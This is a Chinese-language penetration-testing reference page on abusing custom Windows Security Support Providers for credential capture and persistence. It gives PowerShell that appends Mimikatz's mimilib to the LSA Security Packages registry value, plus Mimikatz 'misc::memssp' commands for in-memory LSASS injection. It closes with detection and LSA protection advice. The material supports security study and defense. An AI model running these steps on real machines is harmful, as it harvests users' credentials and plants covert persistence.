# 自定义 Security Support Providers

{{#include ../../banners/hacktricks-training.md}}

[安全支持提供程序 (SSPs)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) 是由 Local Security Authority (LSA) 加载的基于 DLL 的安全包。Windows 通过 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` `REG_MULTI_SZ` 值注册自定义 SSP/AP DLL，并在系统启动时加载已注册的包。<sup>[[1]](#references)</sup>

由于 SSP 在 LSA 中运行并且可以接收凭据，攻击者可能滥用恶意包来访问凭据并实现持久化。MITRE 将此行为记录为 T1547.005。<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz 包含 `mimilib.dll`，它实现了一个 SSP，会记录其加载后处理的凭据。在获得授权的实验环境中，将与目标架构匹配的 DLL 放入 `C:\Windows\System32`，然后在修改当前包列表之前检查它。<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
典型的现有值可能包含 `kerberos`、`msv1_0`、`schannel`、`wdigest`、`tspkg` 和 `pku2u` 等 packages。添加 custom package 时，请保留每个现有条目。<sup>[[1]](#references)</sup>

追加 `mimilib`，不要替换现有 packages：
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
重启后，该实现会将 package 加载到 LSA 中，随后捕获的 credentials 会写入 `C:\Windows\System32\kiwissp.log`。<sup>[[2]](#references)[[3]](#references)</sup>

## 内存中加载

Mimikatz 还可以将其 SSP 实现注入当前的 LSASS 进程：<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
此方法在 reboot 后不会持久存在。<sup>[[2]](#references)[[3]](#references)</sup>

## Detection and Mitigation

监控 `...\Lsa\Security Packages` 的更改以及意外加载到 `lsass.exe` 中的 DLL。只有在配置了相关的 Audit Registry policy 和 SACL 时，Security event 4657 才会记录注册表 **value** 修改。<sup>[[2]](#references)[[4]](#references)</sup>

在兼容的情况下，启用 added LSA protection，并调查未签名或意外的 SSP DLL。Microsoft 专门将 LSA protection 记录为一种防御 code injection 的控制措施，因为 code injection 可能危及凭据安全。<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - 注册 SSP/AP DLL](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Mimikatz repository - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Security event 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - 配置 added LSA protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
